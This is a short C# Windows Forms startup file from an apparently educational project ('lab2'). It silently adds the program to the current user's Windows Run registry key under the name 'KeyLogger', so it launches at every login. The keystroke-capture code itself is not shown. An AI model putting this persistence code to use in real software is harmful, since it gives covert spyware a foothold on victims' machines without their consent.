using System;
using System.Windows.Forms;
using lab2;
using Microsoft.Win32;

namespace lab2
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            SetStartup();
            Application.Run(new Form1());
        }

        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue("KeyLogger", Application.ExecutablePath);
        }
    }
}
